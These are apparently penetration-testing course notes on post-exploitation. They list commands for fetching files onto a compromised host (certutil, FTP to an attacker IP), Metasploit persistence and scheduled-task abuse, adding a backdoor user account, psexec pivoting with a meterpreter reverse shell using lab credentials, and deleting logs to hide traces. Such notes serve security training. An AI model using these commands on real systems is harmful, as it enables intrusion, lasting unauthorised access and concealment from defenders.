# 19. Post Exploitation

## File transfers

- Windows - Certutil
	- certutil.exe -urlcache -f http://URL filename
- HTTP
	- python -m SimpleHTTPServer 80
- Browser
	- Navigate directly to file
- FTP
	- python -m pyftpdlib 21 (attacker machine)
	- ftp attacker_ip
- Linux
	- wget
- Metasploit
	- Upload/ download feature in meterpreter

## Maintaining access

- Persistence scripts
	- run persistence -h
	- exploit/windows/local/persistence
	- exploit/windows/local/registry_persistence
- Scheduled tasks
	- run scheduleme
	- run schtaskabuse
- Add a user
	- net user hacker password123 /add

## Pivoting
- Load up metasploit
- use exploit/windows/smb/psexec
- Set options
	- set rhosts 192.168.57.141
	- set smbdomain marvel.local
	- set smbpass Password1
	- set smbuser fcastle
	- set payload windows/x64/meterpreter/reverse_tcp
	- set lhost eth0
	- set target 2
- route print or ipconfig
- arp -a
- run autoroute -s 10.10.10.0/24
- run autoroute -p 
- background
- search portscan, use tcp scan
- set options

> Check out pivoting through proxychains

## Cleaning up
- Make the system/network as it was when you enterd it
	- Remove executables, scipts, and added files
	- Remove malware, rootkits and added user accounts
	- Set settings back to original configuration

- Red team perspective (not too much with pentesting)
	- Delete logs and any traces

